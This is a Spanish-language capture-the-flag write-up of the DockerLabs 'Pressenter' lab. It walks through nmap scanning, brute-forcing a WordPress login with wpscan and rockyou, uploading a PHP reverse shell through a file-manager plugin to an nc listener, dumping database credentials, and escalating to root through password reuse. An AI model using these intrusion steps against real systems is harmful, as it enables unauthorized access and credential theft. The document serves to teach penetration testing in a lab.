---
title: Pressenter - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | d1se0        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/1e7de8c9-352d-495c-a303-ac2df0163f02)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `80` (HTTP)
A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p80 -sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/3541d37b-ed61-4a33-8c81-007e43a2e26f)

# Exploración Web
Al navegar al puerto 80 vemos un pagina en el empieza diciendo si estamos listo para el reto. Y no se nada mas.

![image](https://github.com/user-attachments/assets/adcfc82b-bf2e-47ef-be51-5f096644bc53)

Mirando en el codigo fuente de la pagina vemos un dominio, `pressenter.hl`, lo añadimos al /etc/hosts. Y accedemos

![image](https://github.com/user-attachments/assets/bfe294e8-3aa3-48dd-8c6e-894491656b12)

A simple vista se ve que es un WordPress, por lo que vamos a ver si tiene `wp-admin` o algun recurso de wordpresss.

![image](https://github.com/user-attachments/assets/c01a2a13-8c20-4328-aa02-c205d2f0475c)

Usaremos WPSCAN para enumerar usuario y asi hacer fuerza bruta.

```bash
wpscan --url http://pressenter.hl/ -e vp,cb,u
```

Encontramos dos usuarios `pressi` y `hacker`. 

Vamos a empezar por `pressi` a ver si por fuerza bruta obtenemos su contraseña.

## Fuerza bruta 

```bash
wpscan --url http://pressenter.hl/ -U pressi -P /usr/share/wordlists/rockyou.txt 
```

![image](https://github.com/user-attachments/assets/d46efe6d-7489-43f4-925d-98915ec82f38)

Tenemos la contrasela `dumbass` del usuario `pressi`, vamos a acceder con ella.

![image](https://github.com/user-attachments/assets/6330cd25-7744-4289-9cbd-f88a0202a524)

# Reverse Shell

Entramos en plugin y instalamos `File Manager`, el cual permite editar, eliminar, subir, renombrar, copiar, pegar, descargar, comprimir (zip), etc. y múltiples operaciones detro del servidor de la pagina.

![image](https://github.com/user-attachments/assets/fea1d042-ab86-4ade-a8f1-4b831d2ba14a)

Aprovechamos la sección de subida de archivos para cargar una reverseshell en PHP. ara esto, generamos una reverseshell desde **Pentest Monkey**, una herramienta popular para crear shells PHP que nos permiten obtener acceso remoto al servidor. La ruta de la reverseshell es la siguiente:

[Reverseshell de Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![image](https://github.com/user-attachments/assets/51f36ccf-e3a0-4fce-bcfb-5b3f8cba0d4e)

En paralelo, escuchamos en nuestro sistema usando `netcat`:
```bash 
nc -lvnp 4444
```

Luego, accedemos a la ruta de la página web donde hemos cargado la reverseshell:

![image](https://github.com/user-attachments/assets/ba14667e-c769-4e9c-9e3c-8ba8c46fbf3d)

Obtuvimos acceso inicial al servidor como www-data.

![image](https://github.com/user-attachments/assets/0cd9e20f-a723-41ff-8818-445f4d845005)

## TTY ReverseShell

### Iniciar una sesión de shell interactiva
En nuestra shell básica, ejecutamos el siguiente comando para forzar la creación de una sesión de bash interactiva:
```bash
script /dev/null -c bash
```
### Suspender la shell
Una vez que el comando anterior está en ejecución, utilizamos
```bash
Control+Z
```
para suspender temporalmente nuestra shell.

### Preparar nuestro terminal local:
Antes de volver a nuestra shell, configuramos nuestro terminal local:
```bash
stty raw -echo; fg
```

### Resetear la configuración del terminal
Ahora que tenemos el control de la shell, la reseteamos para asegurar que se comporta correctamente:
```bash
reset
```

### Configura el tipo de terminal:
```bash
xterm
export TERM=xterm
export SHELL=bash
```

# Intrusion ww-data

Ya que estamos dentro vemos que hay un usuario en el sistema llamado enter, ya que esto tiene wordpress instalado tendra un archivo llamado `wp-config.php` donde está instalado el wordpress y veremos una linea en la que esta el usuario y contraseña:

![image](https://github.com/user-attachments/assets/794d5a1f-48ea-4f17-b1b1-2c5f8eaacb71)

Encontramos el usuario de la base de datos `admin `y la contraseña `rooteable`.

Accedemos a la base de datos a ver que encontramos.

```bash
mysql -u admin --password=rooteable
```

na vez dentro ejecutaremos esto:

```css
show databases;
```

esto nos mostrará las bases de datos, en nuestro caso tenemos estas:

```css
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| wordpress          |
+--------------------+
```

la única que nos puede interesar es la de wordpress, por lo que ahora ejecutaremos `use wordpress`. Ahora que seleccionamos la base de datos, ejecutaremos:

```css
show tables;
```

esto nos mostrará las tablas de la base de datos:

```css
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_usernames          |
| wp_users              |
| wp_wpfm_backup        |
+-----------------------+
```

y ahora ejecutamos:

```css
select*from wp_usernames;
```

y finalmente tendremos la contraseña de enter:

```css
+----+----------+-----------------+---------------------+
| id | username | password        | created_at          |
+----+----------+-----------------+---------------------+
|  1 | enter    | kernellinuxhack | 2024-08-22 13:18:04 |
+----+----------+-----------------+---------------------+
```

Ahora solo ejecutamos `su enter` y ponemos la contraseña, ya habremos escalado un usuario.

# Escalada de Privilegios 

Al ejecutar `sudo -l`, notamos que spencer tiene permisos para ejecutar `cat` como `root` y `whoami` como `root` .Utilizando [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell) sabemos cómo explotar estos binarios.

![image](https://github.com/user-attachments/assets/e72c8d19-7017-480f-9c15-c52d5fd1114a)

Después de investigar un poco he visto que en el directorio raiz del usuario enter tiene un archivo user.txt cosa que me ha hecho deducir que en el directorio root puede haber un equivalente y que pudiendo usar cat como root puedo leerlo.

![image](https://github.com/user-attachments/assets/7974fdd2-0ca0-4bb3-bf80-d8edb3b71112)

![image](https://github.com/user-attachments/assets/3c28faab-82ad-4216-b895-63a1ee64529d)

Hay veces que la respuesta mas fácil es la ultima en probar. Después de un buen rato intentando encontrar la manera de obtener, por diferentes vías, acceso a la contraseña de root me a dado por probar con la misma que el usuario enter.

![image](https://github.com/user-attachments/assets/617bef1d-5194-41ab-9785-5e84b6eb268e)

